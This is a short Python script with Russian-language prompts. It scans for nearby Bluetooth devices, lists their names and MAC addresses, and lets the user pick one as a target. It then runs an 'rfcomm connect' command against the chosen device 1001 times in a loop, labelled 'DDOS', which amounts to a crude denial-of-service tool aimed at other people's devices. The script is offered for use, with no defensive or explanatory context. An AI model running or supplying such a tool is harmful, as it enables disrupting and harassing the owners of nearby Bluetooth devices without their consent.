#!/usr/bin/python3

# geektechstuff bluetooth

import bluetooth
import subprocess

def scan():

    print("Поиск устройств...")
    devices = bluetooth.discover_devices(lookup_names = True, lookup_class = True)
    number_of_devices = len(devices)
    print(number_of_devices,"найдено устройств")
    index = 0
    for addr, name, device_class in devices:
        print("---"*6)
        print("ID(Надо ввести): %s" % (index) )
        print("Названия: %s" % (name))
        print("МАК адресс: %s" % (addr))
        index += 1
    print("---"*6)
    while True:
        try:
            id = int(input("Введите ID девайса(Число): "))
            if id != None and devices[id] != None:
                break
        except:
            print("Ошибка еще раз..") 
    cmd=['rfcomm', 'connect', devices[id][0], '1']
    print('DDOS...')
    for i in range(0, 1001):
        subprocess.run(cmd)
    print('Connected')
    return

scan()